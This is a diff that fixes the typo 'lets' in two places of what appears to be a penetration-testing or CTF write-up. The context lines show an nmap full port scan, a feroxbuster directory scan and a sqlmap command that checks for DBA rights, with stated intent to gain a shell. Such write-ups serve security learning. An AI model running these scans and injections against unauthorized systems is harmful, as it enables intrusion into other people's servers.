@@ -21,7 +21,7 @@ Looks like we have a website and ssh running. Let's run a full nmap scan in the 
 $ sudo nmap -sS -sU -sC -sV -oA recon/nmap/full -p- -v3 --min-rate 1000 $TARGET
 ```
 
-Since we found a web server on port 80 lets also run feroxbuster:
+Since we found a web server on port 80 let's also run feroxbuster:
 
 ```BASH
 $ feroxbuster -u http://$TARGET -w /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt -o recon/feroxMedWords
@@ -350,7 +350,7 @@ Parameter: #1* (URI)
  ... snip ...
 ```
 
-Nothing interesting in the db. Since we know the web app uses the root user lets check if we are DBA and try to get a shell using sqlmap.
+Nothing interesting in the db. Since we know the web app uses the root user let's check if we are DBA and try to get a shell using sqlmap.
 
 ```
 $ sqlmap -r request.req --level 5 --risk 3 --is-dba --batch
